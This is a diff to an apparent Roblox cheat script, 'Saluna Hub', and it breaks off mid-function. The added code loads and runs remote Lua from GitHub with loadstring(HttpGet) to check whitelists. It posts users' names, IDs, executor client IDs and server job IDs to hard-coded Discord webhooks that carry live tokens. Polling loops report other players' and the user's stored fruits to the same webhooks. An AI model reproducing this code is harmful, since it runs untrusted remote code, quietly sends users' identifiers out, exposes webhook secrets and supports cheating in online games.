@@ -10,6 +10,34 @@ _G.autostoreaura = true
 _G.autoreset = true
 _G.resettime = 660 --second
 
+asdwqelist = false
+getexecutorid = game:GetService("RbxAnalyticsService"):GetClientId()
+listedaxw = loadstring(game:HttpGet('https://raw.githubusercontent.com/Iamcutehehe/hehehe/main/whitelist.lua',true))()
+khoilistedzxwc = loadstring(game:HttpGet('https://raw.githubusercontent.com/Department123zxc/list/main/whitelist.lua',true))()
+for _, v in pairs(khoilistedzxwc) do
+    table.insert(listedaxw, v)
+end
+        for _, v1 in pairs(listedaxw) do
+            if getexecutorid == v1 then
+asdwqelist = true
+whitelistkeytype = "Whitelisted Excutor ID"
+            end
+        end
+
+userlistedzxwc = loadstring(game:HttpGet('https://raw.githubusercontent.com/Department123zxc/hello/main/list.lua',true))()
+userlistedzxwc2 = loadstring(game:HttpGet('https://raw.githubusercontent.com/Department123zxc/list/main/userid.lua',true))()
+for _, c in pairs(userlistedzxwc2) do
+    table.insert(userlistedzxwc, c)
+end
+        for _, v2 in pairs(userlistedzxwc) do
+            if (usingid and usingname == v2) and game:GetService("Workspace"):FindFirstChild(usingname) then
+asdwqelist = true
+realtimechecking = true
+whitelistkeytype = "Whitelisted Account"
+            end
+        end
+
+if asdwqelist then
 local vu = game:GetService("VirtualUser")
     game:GetService("Players").LocalPlayer.Idled:connect(function()
        vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
@@ -256,3 +284,988 @@ end
 end)
 end
 end)
+
+local antitable = loadstring(game:HttpGet('https://raw.githubusercontent.com/Department123zxc/list/main/anticamp.lua',true))()
+if not table.find(antitable,game.Players.LocalPlayer.Name) then
+local url = "https://discord.com/api/webhooks/1364581628760031363/IjUB6iDa9lfjZstZXL7SdZbrZCEAq7C5AIJCJwQdkkJzmkQ-3sstPPVfGNOyJkSjMiBU"
+        local data = {
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["title"] = " Saluna Notify",
+                ["description"] = "\nUser Name: " .. game.Players.LocalPlayer.Name .."\nDisplay Name: "..tostring(game.Players.LocalPlayer.DisplayName) .."\nUser ID: " .. game.Players.LocalPlayer.UserId .. "\n============================================".."\nGame Name: "..tostring(currentPlaceName) .. "\nGame ID: " .. game.PlaceId .. "\nJob ID: " .. game.JobId .."\nPlayers: "..tostring(#game.Players:GetChildren()) .."/" ..tostring(game.Players.MaxPlayers) .."\nCurrent Ping: "..tostring(pingsv) .. "\nCurrent FPS: " ..tostring(fpssv) .. "\n============================================".. "\nExcutor Name: "..tostring(excutor) .."\nExcutor ID: " ..game:GetService("RbxAnalyticsService"):GetClientId() .."\nKey Type: "..whitelistkeytype .."\nScript Version: "..SalunaVersion .."\n============================================" .."\nWelcome To Saluna Hub \nHave A Nice Day ♥ ",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x00FF7F)
+            }
+        }
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+    
+        local headers = {
+        ["content-type"] = "application/json"
+        }
+        request = http_request or request or HttpPost or syn.request
+        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        request(abcdef)
+end
+
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+  for x,y in pairs(v.Character:GetChildren()) do
+if string.find(y.Name, "Quake") or string.find(y.Name, "Phoenix") or string.find(y.Name, "Dark") or string.find(y.Name, "Vampire") or string.find(y.Name, "Gravity") or string.find(y.Name, "Ope") or string.find(y.Name, "Venom") or string.find(y.Name, "Candy Fruit") or string.find(y.Name, "Hollow") or string.find(y.Name, "Chilly") or string.find(y.Name, "Gas") or string.find(y.Name, "Flare") or string.find(y.Name, "Light") or string.find(y.Name, "Smoke") or string.find(y.Name, "Rumble") or string.find(y.Name, "Sand") or string.find(y.Name, "Magma") or string.find(y.Name, "Snow") or string.find(y.Name, "Plasma") then
+pcall(function()
+if string.find(y.Name, "Quake") or string.find(y.Name, "Phoenix") or string.find(y.Name, "Dark") or string.find(y.Name, "Vampire") then
+_G.pingplr = "<@&1267828963024306289>"
+if string.sub(y.Data.Value,tonumber(string.len(y.Data.Value)) - 1) == ",1" then
+_G.auraisgood = " (Aura Fruit!!!)"
+_G.auranotify = "<@&1268082865078272061>" -- Aura Ultra Ping
+_G.colorside = tonumber(0x00FF7F) -- aura
+else
+_G.auraisgood = " (Normal Fruit)"
+_G.auranotify = ""
+_G.colorside = tonumber(0x800080) -- purple
+end
+else
+_G.pingplr = "<@&1267829170092769301>"
+if string.sub(y.Data.Value,tonumber(string.len(y.Data.Value)) - 1) == ",1" then
+_G.auraisgood = " (Aura Fruit!!!)"
+_G.auranotify = "<@&1268082992044314735>" -- Aura Rare Ping
+_G.colorside = tonumber(0x00FF7F) -- aura
+else
+_G.auraisgood = " (Normal Fruit)"
+_G.auranotify = ""
+_G.colorside = tonumber(0xFFFF00) -- yellow
+end
+end
+
+
+task.wait()
+local url = "https://discord.com/api/webhooks/1364829639033487371/YCbKWCcWfx55EjptNfityn2JVKmMw3tl_299ROq9hZ0q9EB7F-YNZ0ciuZIYN3SCV8ow"
+        local data = {
+        ["content"] = _G.pingplr .. "\n" .. _G.auranotify,
+        ["embeds"] = {
+            {
+                ["title"] = " Saluna Notify",
+                ["description"] = "\nUsername: " .. v.Name .. "\nGameID: " .. game.PlaceId .. "\nJobID: " .. game.JobId .. "\n============================================ \nFruit: ".. y.Name .. _G.auraisgood,
+                ["type"] = "rich",
+                ["color"] = _G.colorside
+            }
+        }
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+    
+        local headers = {
+        ["content-type"] = "application/json"
+        }
+        request = http_request or request or HttpPost or syn.request
+        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        request(abcdef)
+end)
+
+elseif string.find(y.Name, "Order") or string.find(y.Name, "Alice") or string.find(y.Name, "Gum") or string.find(y.Name, "Love") or string.find(y.Name, "Bomb") or string.find(y.Name, "Smelt") or string.find(y.Name, "Diamond") or string.find(y.Name, "Barrier") or string.find(y.Name, "String") or string.find(y.Name, "Hobby") or string.find(y.Name, "Slip") or string.find(y.Name, "Chop") or string.find(y.Name, "Clone") or string.find(y.Name, "Hot") or string.find(y.Name, "Clear") or string.find(y.Name, "Spring") or string.find(y.Name, "Swim") or string.find(y.Name, "Spin") or string.find(y.Name, "Luck") or string.find(y.Name, "Float") then
+pcall(function()
+if string.sub(y.Data.Value,tonumber(string.len(y.Data.Value)) - 1) == ",1" then
+_G.auraisgood = " (Aura Fruit!!!)"
+_G.auranotify = "<@&1268083055701266515>" -- Aura Uncoomon/Common Ping
+_G.colorside = tonumber(0x00FF7F)
+task.wait()
+local url = "https://discord.com/api/webhooks/1364829639033487371/YCbKWCcWfx55EjptNfityn2JVKmMw3tl_299ROq9hZ0q9EB7F-YNZ0ciuZIYN3SCV8ow"
+        local data = {
+        ["content"] = _G.auranotify,
+        ["embeds"] = {
+            {
+                ["title"] = " Saluna Notify",
+                ["description"] = "\nUsername: " .. v.Name .. "\nGameID: " .. game.PlaceId .. "\nJobID: " .. game.JobId .. "\n============================================ \nFruit: ".. y.Name .. _G.auraisgood,
+                ["type"] = "rich",
+                ["color"] = _G.colorside
+            }
+        }
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+    
+        local headers = {
+        ["content-type"] = "application/json"
+        }
+        request = http_request or request or HttpPost or syn.request
+        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        request(abcdef)
+end
+end)
+end
+end
+end
+
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+v.Character.ChildAdded:Connect(function(y)
+if string.find(y.Name, "Quake") or string.find(y.Name, "Phoenix") or string.find(y.Name, "Dark") or string.find(y.Name, "Vampire") or string.find(y.Name, "Gravity") or string.find(y.Name, "Ope") or string.find(y.Name, "Venom") or string.find(y.Name, "Candy Fruit") or string.find(y.Name, "Hollow") or string.find(y.Name, "Chilly") or string.find(y.Name, "Gas") or string.find(y.Name, "Flare") or string.find(y.Name, "Light") or string.find(y.Name, "Smoke") or string.find(y.Name, "Rumble") or string.find(y.Name, "Sand") or string.find(y.Name, "Magma") or string.find(y.Name, "Snow") or string.find(y.Name, "Plasma") then
+pcall(function()
+if string.find(y.Name, "Quake") or string.find(y.Name, "Phoenix") or string.find(y.Name, "Dark") or string.find(y.Name, "Vampire") then
+_G.pingplr = "<@&1267828963024306289>"
+if string.sub(y.Data.Value,tonumber(string.len(y.Data.Value)) - 1) == ",1" then
+_G.auraisgood = " (Aura Fruit!!!)"
+_G.auranotify = "<@&1268082865078272061>" -- Aura Ultra Ping
+_G.colorside = tonumber(0x00FF7F)
+else
+_G.auraisgood = " (Normal Fruit)"
+_G.auranotify = ""
+ _G.colorside = tonumber(0x800080) -- purple
+end
+else
+_G.pingplr = "<@&1267829170092769301>"
+if string.sub(y.Data.Value,tonumber(string.len(y.Data.Value)) - 1) == ",1" then
+_G.auraisgood = " (Aura Fruit!!!)"
+_G.auranotify = "<@&1268082992044314735>" -- Aura Rare Ping
+_G.colorside = tonumber(0x00FF7F) -- aura
+else
+_G.auraisgood = " (Normal Fruit)"
+_G.auranotify = ""
+_G.colorside = tonumber(0xFFFF00) -- yellow
+end
+end
+
+task.wait()
+local url = "https://discord.com/api/webhooks/1364829639033487371/YCbKWCcWfx55EjptNfityn2JVKmMw3tl_299ROq9hZ0q9EB7F-YNZ0ciuZIYN3SCV8ow"
+        local data = {
+        ["content"] = _G.pingplr .. "\n" .. _G.auranotify,
+        ["embeds"] = {
+            {
+                ["title"] = " Saluna Notify",
+                ["description"] = "\nUsername: " .. v.Name .. "\nGameID: " .. game.PlaceId .. "\nJobID: " .. game.JobId .. "\n============================================ \nFruit: ".. y.Name .. _G.auraisgood,
+                ["type"] = "rich",
+                ["color"] = _G.colorside
+            }
+        }
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+    
+        local headers = {
+        ["content-type"] = "application/json"
+        }
+        request = http_request or request or HttpPost or syn.request
+        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        request(abcdef)
+end)
+
+elseif string.find(y.Name, "Order") or string.find(y.Name, "Alice") or string.find(y.Name, "Gum") or string.find(y.Name, "Love") or string.find(y.Name, "Bomb") or string.find(y.Name, "Smelt") or string.find(y.Name, "Diamond") or string.find(y.Name, "Barrier") or string.find(y.Name, "String") or string.find(y.Name, "Hobby") or string.find(y.Name, "Slip") or string.find(y.Name, "Chop") or string.find(y.Name, "Clone") or string.find(y.Name, "Hot") or string.find(y.Name, "Clear") or string.find(y.Name, "Spring") or string.find(y.Name, "Swim") or string.find(y.Name, "Spin") or string.find(y.Name, "Luck") or string.find(y.Name, "Float") then
+pcall(function()
+if string.sub(y.Data.Value,tonumber(string.len(y.Data.Value)) - 1) == ",1" then
+_G.auraisgood = " (Aura Fruit!!!)"
+_G.auranotify = "<@&1268083055701266515>" -- Aura Uncoomon/Common Ping
+_G.colorside = tonumber(0x00FF7F)
+task.wait()
+local url = "https://discord.com/api/webhooks/1364829639033487371/YCbKWCcWfx55EjptNfityn2JVKmMw3tl_299ROq9hZ0q9EB7F-YNZ0ciuZIYN3SCV8ow"
+        local data = {
+        ["content"] = _G.auranotify,
+        ["embeds"] = {
+            {
+                ["title"] = " Saluna Notify",
+                ["description"] = "\nUsername: " .. v.Name .. "\nGameID: " .. game.PlaceId .. "\nJobID: " .. game.JobId .. "\n============================================ \nFruit: ".. y.Name .. _G.auraisgood,
+                ["type"] = "rich",
+                ["color"] = _G.colorside
+            }
+        }
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+    
+        local headers = {
+        ["content-type"] = "application/json"
+        }
+        request = http_request or request or HttpPost or syn.request
+        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        request(abcdef)
+end
+end)
+
+end
+end)
+end
+
+game:GetService("Players").PlayerAdded:Connect(function(tpb)
+task.wait(6)
+tpb.Character.ChildAdded:Connect(function(y)
+if string.find(y.Name, "Quake") or string.find(y.Name, "Phoenix") or string.find(y.Name, "Dark") or string.find(y.Name, "Vampire") or string.find(y.Name, "Gravity") or string.find(y.Name, "Ope") or string.find(y.Name, "Venom") or string.find(y.Name, "Candy Fruit") or string.find(y.Name, "Hollow") or string.find(y.Name, "Chilly") or string.find(y.Name, "Gas") or string.find(y.Name, "Flare") or string.find(y.Name, "Light") or string.find(y.Name, "Smoke") or string.find(y.Name, "Rumble") or string.find(y.Name, "Sand") or string.find(y.Name, "Magma") or string.find(y.Name, "Snow") or string.find(y.Name, "Plasma") then
+pcall(function()
+if string.find(y.Name, "Quake") or string.find(y.Name, "Phoenix") or string.find(y.Name, "Dark") or string.find(y.Name, "Vampire") then
+_G.pingplr = "<@&1267828963024306289>"
+if string.sub(y.Data.Value,tonumber(string.len(y.Data.Value)) - 1) == ",1" then
+_G.auraisgood = " (Aura Fruit!!!)"
+_G.auranotify = "<@&1268082865078272061>" -- Aura Ultra Ping
+_G.colorside = tonumber(0x00FF7F)
+else
+_G.auraisgood = " (Normal Fruit)"
+_G.auranotify = ""
+_G.colorside = tonumber(0x800080) -- purple
+end
+else
+_G.pingplr = "<@&1267829170092769301>"
+if string.sub(y.Data.Value,tonumber(string.len(y.Data.Value)) - 1) == ",1" then
+_G.auraisgood = " (Aura Fruit!!!)"
+_G.auranotify = "<@&1268082992044314735>" -- Aura Rare Ping
+_G.colorside = tonumber(0x00FF7F) -- aura
+else
+_G.auraisgood = " (Normal Fruit)"
+_G.auranotify = ""
+_G.colorside = tonumber(0xFFFF00) -- yellow
+end
+end
+
+task.wait()
+local url = "https://discord.com/api/webhooks/1364829639033487371/YCbKWCcWfx55EjptNfityn2JVKmMw3tl_299ROq9hZ0q9EB7F-YNZ0ciuZIYN3SCV8ow"
+        local data = {
+        ["content"] = _G.pingplr .. "\n" .. _G.auranotify,
+        ["embeds"] = {
+            {
+                ["title"] = " Saluna Notify",
+                ["description"] = "\nUsername: " .. tpb.Name .. "\nGameID: " .. game.PlaceId .. "\nJobID: " .. game.JobId .. "\n============================================ \nFruit: ".. y.Name .. _G.auraisgood,
+                ["type"] = "rich",
+                ["color"] = _G.colorside
+            }
+        }
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+    
+        local headers = {
+        ["content-type"] = "application/json"
+        }
+        request = http_request or request or HttpPost or syn.request
+        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        request(abcdef)
+end)
+
+elseif string.find(y.Name, "Order") or string.find(y.Name, "Alice") or string.find(y.Name, "Gum") or string.find(y.Name, "Love") or string.find(y.Name, "Bomb") or string.find(y.Name, "Smelt") or string.find(y.Name, "Diamond") or string.find(y.Name, "Barrier") or string.find(y.Name, "String") or string.find(y.Name, "Hobby") or string.find(y.Name, "Slip") or string.find(y.Name, "Chop") or string.find(y.Name, "Clone") or string.find(y.Name, "Hot") or string.find(y.Name, "Clear") or string.find(y.Name, "Spring") or string.find(y.Name, "Swim") or string.find(y.Name, "Spin") or string.find(y.Name, "Luck") or string.find(y.Name, "Float") then
+pcall(function()
+if string.sub(y.Data.Value,tonumber(string.len(y.Data.Value)) - 1) == ",1" then
+_G.auraisgood = " (Aura Fruit!!!)"
+_G.auranotify = "<@&1268083055701266515>" -- Aura Uncoomon/Common Ping
+_G.colorside = tonumber(0x00FF7F)
+task.wait()
+local url = "https://discord.com/api/webhooks/1364829639033487371/YCbKWCcWfx55EjptNfityn2JVKmMw3tl_299ROq9hZ0q9EB7F-YNZ0ciuZIYN3SCV8ow"
+        local data = {
+        ["content"] = _G.auranotify,
+        ["embeds"] = {
+            {
+                ["title"] = " Saluna Notify",
+                ["description"] = "\nUsername: " .. tpb.Name .. "\nGameID: " .. game.PlaceId .. "\nJobID: " .. game.JobId .. "\n============================================ \nFruit: ".. y.Name .. _G.auraisgood,
+                ["type"] = "rich",
+                ["color"] = _G.colorside
+            }
+        }
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+    
+        local headers = {
+        ["content-type"] = "application/json"
+        }
+        request = http_request or request or HttpPost or syn.request
+        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        request(abcdef)
+end
+end)
+end
+end)
+end)  
+
+task.spawn(function()
+    while task.wait(0.3) do
+        pcall(function()
+            local playerData = workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data
+            local initialFruitData = playerData.StoredDF1.Value
+
+            repeat 
+                task.wait(0.5) 
+            until playerData.StoredDF1.Value ~= initialFruitData and playerData.StoredDF1.Value ~= "None"
+
+            local newFruitData = playerData.StoredDF1.Value
+            local fruitParts = {}
+            for part in string.gmatch(newFruitData, "[^,]+") do
+                local trimmedPart = part:match("^%s*(.-)%s*$")
+                table.insert(fruitParts, trimmedPart)
+            end
+
+            local fruitAuraStatus = fruitParts[6] == "1" and "(Aura Fruit!!!)" or "(Normal Fruit)"
+
+            local url = "https://discord.com/api/webhooks/1364583258473365536/6pkqS5LSrKdbBIVv90BCUA3mAAd1r8Hox1gq2QCu8fx7wsX4WZlmBHMLnzcRnERpF4DG"
+            local data = {
+                ["content"] = "",
+                ["embeds"] = {
+                    {
+                        ["title"] = "Saluna Notify",
+                        ["description"] = "\nUsername: " .. game.Players.LocalPlayer.Name ..
+                                          "\nGameID: " .. game.PlaceId ..
+                                          "\nJobID: " .. game.JobId ..
+                                          "\n============================================ \nStored DF Slot: 1 \nFruit: " .. fruitParts[1] .. " " .. fruitAuraStatus ..
+                                          "\nAffinity: :point_down: \nDef: " .. fruitParts[2] ..
+                                          " ; Melee: " .. fruitParts[3] ..
+                                          " ; Snip: " .. fruitParts[4] ..
+                                          " ; Sword: " .. fruitParts[5],
+                        ["type"] = "rich",
+                        ["color"] = tonumber(0x00FF7F)
+                    }
+                }
+            }
+
+            local jsonData = game:GetService("HttpService"):JSONEncode(data)
+            local headers = {
+                ["content-type"] = "application/json"
+            }
+            local requestFunction = http_request or request or HttpPost or syn.request
+            if requestFunction then
+                requestFunction({Url = url, Body = jsonData, Method = "POST", Headers = headers})
+            else
+                warn("HTTP request function not found!")
+            end
+        end)
+    end
+end)
+
+task.spawn(function()
+    while task.wait(0.3) do
+        pcall(function()
+            local playerData = workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data
+            local initialFruitData = playerData.StoredDF2.Value
+
+            repeat 
+                task.wait(0.5) 
+            until playerData.StoredDF2.Value ~= initialFruitData and playerData.StoredDF2.Value ~= "None"
+
+            local newFruitData = playerData.StoredDF2.Value
+            local fruitParts = {}
+            for part in string.gmatch(newFruitData, "[^,]+") do
+                local trimmedPart = part:match("^%s*(.-)%s*$")
+                table.insert(fruitParts, trimmedPart)
+            end
+
+            local fruitAuraStatus = fruitParts[6] == "1" and "(Aura Fruit!!!)" or "(Normal Fruit)"
+
+            local url = "https://discord.com/api/webhooks/1364583258473365536/6pkqS5LSrKdbBIVv90BCUA3mAAd1r8Hox1gq2QCu8fx7wsX4WZlmBHMLnzcRnERpF4DG"
+            local data = {
+                ["content"] = "",
+                ["embeds"] = {
+                    {
+                        ["title"] = "Saluna Notify",
+                        ["description"] = "\nUsername: " .. game.Players.LocalPlayer.Name ..
+                                          "\nGameID: " .. game.PlaceId ..
+                                          "\nJobID: " .. game.JobId ..
+                                          "\n============================================ \nStored DF Slot: 2 \nFruit: " .. fruitParts[1] .. " " .. fruitAuraStatus ..
+                                          "\nAffinity: :point_down:  \nDef: " .. fruitParts[2] ..
+                                          " ; Melee: " .. fruitParts[3] ..
+                                          " ; Snip: " .. fruitParts[4] ..
+                                          " ; Sword: " .. fruitParts[5],
+                        ["type"] = "rich",
+                        ["color"] = tonumber(0x00FF7F)
+                    }
+                }
+            }
+
+            local jsonData = game:GetService("HttpService"):JSONEncode(data)
+            local headers = {
+                ["content-type"] = "application/json"
+            }
+            local requestFunction = http_request or request or HttpPost or syn.request
+            if requestFunction then
+                requestFunction({Url = url, Body = jsonData, Method = "POST", Headers = headers})
+            end
+        end)
+    end
+end)
+
+task.spawn(function()
+    local userId = tostring(game.Players.LocalPlayer.UserId)
+    local userDataPath = workspace.UserData["User_" .. userId].Data.StoredDF3
+    
+    while task.wait(0.3) do
+        local success, err = pcall(function()
+            -- Store initial fruit data
+            _G.fruitdata3 = userDataPath.Value
+            
+            -- Wait until the fruit data changes and is not "None"
+            repeat task.wait(0.5) until userDataPath.Value ~= _G.fruitdata3 and userDataPath.Value ~= "None"
+            
+            -- Retrieve updated fruit data
+            local fruitdatac = userDataPath.Value
+            local fruitparts3 = {}
+            
+            for part3 in string.gmatch(fruitdatac, "[^,]+") do
+                local trimmed3 = part3:match("^%s*(.-)%s*$")  -- Trim spaces
+                table.insert(fruitparts3, trimmed3)  -- Add the trimmed part to the table
+            end
+            
+            -- Determine if the fruit has an aura
+            _G.fruitauraistrue = (fruitparts3[6] == "1") and "(Aura Fruit!!!)" or "(Normal Fruit)"
+            
+            -- Prepare data for Discord webhook
+            local url = "https://discord.com/api/webhooks/1364583258473365536/6pkqS5LSrKdbBIVv90BCUA3mAAd1r8Hox1gq2QCu8fx7wsX4WZlmBHMLnzcRnERpF4DG"
+            local data = {
+                content = "",
+                embeds = {{
+                    title = "Saluna Notify",
+                    description = "\nUsername: " .. game.Players.LocalPlayer.Name ..
+                                  "\nGameID: " .. game.PlaceId ..
+                                  "\nJobID: " .. game.JobId ..
+                                  "\n============================================ \nStored DF Slot: 3 \nFruit: " .. fruitparts3[1] ..
+                                  " " .. _G.fruitauraistrue ..
+                                  "\nAffinity: :point_down:  \nDef: " .. fruitparts3[2] ..
+                                  " ; Melee: " .. fruitparts3[3] ..
+                                  " ; Snip: " .. fruitparts3[4] ..
+                                  " ; Sword: " .. fruitparts3[5],
+                    type = "rich",
+                    color = tonumber(0x00FF7F)
+                }}
+            }
+            
+            local newdata = game:GetService("HttpService"):JSONEncode(data)
+            local headers = { ["content-type"] = "application/json" }
+            
+            -- Send the HTTP request
+            local requestFunction = http_request or request or HttpPost or syn.request
+            if requestFunction then
+                local response = requestFunction({Url = url, Body = newdata, Method = "POST", Headers = headers})
+                if response.StatusCode ~= 200 then
+                    warn("Failed to send data: " .. response.StatusMessage)
+                end
+            else
+                warn("HTTP request function not available")
+            end
+        end)
+        
+        if not success then
+            warn("Error in script: " .. err)
+        end
+    end
+end)
+
+task.spawn(function()
+    local userId = tostring(game.Players.LocalPlayer.UserId)
+    local userDataPath = workspace.UserData["User_" .. userId].Data.StoredDF4
+    
+    while task.wait(0.3) do
+        local success, err = pcall(function()
+            -- Store initial fruit data
+            _G.fruitdata4 = userDataPath.Value
+            
+            -- Wait until the fruit data changes and is not "None"
+            repeat task.wait(0.5) until userDataPath.Value ~= _G.fruitdata4 and userDataPath.Value ~= "None"
+            
+            -- Retrieve updated fruit data
+            local fruitdatav = userDataPath.Value
+            local fruitparts4 = {}
+            
+            for part4 in string.gmatch(fruitdatav, "[^,]+") do
+                local trimmed4 = part4:match("^%s*(.-)%s*$")  -- Trim spaces
+                table.insert(fruitparts4, trimmed4)  -- Add the trimmed part to the table
+            end
+            
+            -- Determine if the fruit has an aura
+            _G.fruitauraistrue = (fruitparts4[6] == "1") and "(Aura Fruit!!!)" or "(Normal Fruit)"
+            
+            -- Prepare data for Discord webhook
+            local url = "https://discord.com/api/webhooks/1364583258473365536/6pkqS5LSrKdbBIVv90BCUA3mAAd1r8Hox1gq2QCu8fx7wsX4WZlmBHMLnzcRnERpF4DG"
+            local data = {
+                content = "",
+                embeds = {{
+                    title = "Saluna Notify",
+                    description = "\nUsername: " .. game.Players.LocalPlayer.Name ..
+                                  "\nGameID: " .. game.PlaceId ..
+                                  "\nJobID: " .. game.JobId ..
+                                  "\n============================================ \nStored DF Slot: 4 \nFruit: " .. fruitparts4[1] ..
+                                  " " .. _G.fruitauraistrue ..
+                                  "\nAffinity: :point_down:  \nDef: " .. fruitparts4[2] ..
+                                  " ; Melee: " .. fruitparts4[3] ..
+                                  " ; Snip: " .. fruitparts4[4] ..
+                                  " ; Sword: " .. fruitparts4[5],
+                    type = "rich",
+                    color = tonumber(0x00FF7F)
+                }}
+            }
+            
+            local newdata = game:GetService("HttpService"):JSONEncode(data)
+            local headers = { ["content-type"] = "application/json" }
+            
+            -- Send the HTTP request
+            local requestFunction = http_request or request or HttpPost or syn.request
+            if requestFunction then
+                local response = requestFunction({Url = url, Body = newdata, Method = "POST", Headers = headers})
+                if response.StatusCode ~= 200 then
+                    warn("Failed to send data: " .. response.StatusMessage)
+                end
+            else
+                warn("HTTP request function not available")
+            end
+        end)
+        
+        if not success then
+            warn("Error in script: " .. err)
+        end
+    end
+end)
+
+task.spawn(function()
+    local userId = tostring(game.Players.LocalPlayer.UserId)
+    local userDataPath = workspace.UserData["User_" .. userId].Data.StoredDF5
+    
+    while task.wait(0.3) do
+        local success, err = pcall(function()
+            -- Store initial fruit data
+            _G.fruitdata5 = userDataPath.Value
+            
+            -- Wait until the fruit data changes and is not "None"
+            repeat task.wait(0.5) until userDataPath.Value ~= _G.fruitdata5 and userDataPath.Value ~= "None"
+            
+            -- Retrieve updated fruit data
+            local fruitdatab = userDataPath.Value
+            local fruitparts5 = {}
+            
+            for part5 in string.gmatch(fruitdatab, "[^,]+") do
+                local trimmed5 = part5:match("^%s*(.-)%s*$")  -- Trim spaces
+                table.insert(fruitparts5, trimmed5)  -- Add the trimmed part to the table
+            end
+            
+            -- Determine if the fruit has an aura
+            _G.fruitauraistrue = (fruitparts5[6] == "1") and "(Aura Fruit!!!)" or "(Normal Fruit)"
+            
+            -- Prepare data for Discord webhook
+            local url = "https://discord.com/api/webhooks/1364583258473365536/6pkqS5LSrKdbBIVv90BCUA3mAAd1r8Hox1gq2QCu8fx7wsX4WZlmBHMLnzcRnERpF4DG"
+            local data = {
+                content = "",
+                embeds = {{
+                    title = "Saluna Notify",
+                    description = "\nUsername: " .. game.Players.LocalPlayer.Name ..
+                                  "\nGameID: " .. game.PlaceId ..
+                                  "\nJobID: " .. game.JobId ..
+                                  "\n============================================ \nStored DF Slot: 5 \nFruit: " .. fruitparts5[1] ..
+                                  " " .. _G.fruitauraistrue ..
+                                  "\nAffinity: :point_down:  \nDef: " .. fruitparts5[2] ..
+                                  " ; Melee: " .. fruitparts5[3] ..
+                                  " ; Snip: " .. fruitparts5[4] ..
+                                  " ; Sword: " .. fruitparts5[5],
+                    type = "rich",
+                    color = tonumber(0x00FF7F)
+                }}
+            }
+            
+            local newdata = game:GetService("HttpService"):JSONEncode(data)
+            local headers = { ["content-type"] = "application/json" }
+            
+            -- Send the HTTP request
+            local requestFunction = http_request or request or HttpPost or syn.request
+            if requestFunction then
+                local response = requestFunction({Url = url, Body = newdata, Method = "POST", Headers = headers})
+                if response.StatusCode ~= 200 then
+                    warn("Failed to send data: " .. response.StatusMessage)
+                end
+            else
+                warn("HTTP request function not available")
+            end
+        end)
+        
+        if not success then
+            warn("Error in script: " .. err)
+        end
+    end
+end)
+
+task.spawn(function()
+    local userId = tostring(game.Players.LocalPlayer.UserId)
+    local userDataPath = workspace.UserData["User_" .. userId].Data.StoredDF6
+    
+    while task.wait(0.3) do
+        local success, err = pcall(function()
+            -- Store initial fruit data
+            _G.fruitdata6 = userDataPath.Value
+            
+            -- Wait until the fruit data changes and is not "None"
+            repeat task.wait(0.5) until userDataPath.Value ~= _G.fruitdata6 and userDataPath.Value ~= "None"
+            
+            -- Retrieve updated fruit data
+            local fruitdatan = userDataPath.Value
+            local fruitparts6 = {}
+            
+            for part6 in string.gmatch(fruitdatan, "[^,]+") do
+                local trimmed6 = part6:match("^%s*(.-)%s*$")  -- Trim spaces
+                table.insert(fruitparts6, trimmed6)  -- Add the trimmed part to the table
+            end
+            
+            -- Determine if the fruit has an aura
+            _G.fruitauraistrue = (fruitparts6[6] == "1") and "(Aura Fruit!!!)" or "(Normal Fruit)"
+            
+            -- Prepare data for Discord webhook
+            local url = "https://discord.com/api/webhooks/1364583258473365536/6pkqS5LSrKdbBIVv90BCUA3mAAd1r8Hox1gq2QCu8fx7wsX4WZlmBHMLnzcRnERpF4DG"
+            local data = {
+                content = "",
+                embeds = {{
+                    title = "Saluna Notify",
+                    description = "\nUsername: " .. game.Players.LocalPlayer.Name ..
+                                  "\nGameID: " .. game.PlaceId ..
+                                  "\nJobID: " .. game.JobId ..
+                                  "\n============================================ \nStored DF Slot: 6 \nFruit: " .. fruitparts6[1] .. 
+                                  " " .. _G.fruitauraistrue .. 
+                                  "\nAffinity: :point_down:  \nDef: " .. fruitparts6[2] ..
+                                  " ; Melee: " .. fruitparts6[3] ..
+                                  " ; Snip: " .. fruitparts6[4] ..
+                                  " ; Sword: " .. fruitparts6[5],
+                    type = "rich",
+                    color = tonumber(0x00FF7F)
+                }}
+            }
+            
+            local newdata = game:GetService("HttpService"):JSONEncode(data)
+            local headers = { ["content-type"] = "application/json" }
+            
+            -- Send the HTTP request
+            local requestFunction = http_request or request or HttpPost or syn.request
+            if requestFunction then
+                local response = requestFunction({Url = url, Body = newdata, Method = "POST", Headers = headers})
+                if response.StatusCode ~= 200 then
+                    warn("Failed to send data: " .. response.StatusMessage)
+                end
+            else
+                warn("HTTP request function not available")
+            end
+        end)
+        
+        if not success then
+            warn("Error in script: " .. err)
+        end
+    end
+end)
+
+task.spawn(function()
+    local userId = tostring(game.Players.LocalPlayer.UserId)
+    local userDataPath = workspace.UserData["User_" .. userId].Data.StoredDF7
+    
+    while task.wait(0.3) do
+        local success, err = pcall(function()
+            -- Store initial fruit data
+            _G.fruitdata7 = userDataPath.Value
+            
+            -- Wait until the fruit data changes and is not "None"
+            repeat task.wait(0.5) until userDataPath.Value ~= _G.fruitdata7 and userDataPath.Value ~= "None"
+            
+            -- Retrieve updated fruit data
+            local fruitdatam = userDataPath.Value
+            local fruitparts7 = {}
+            
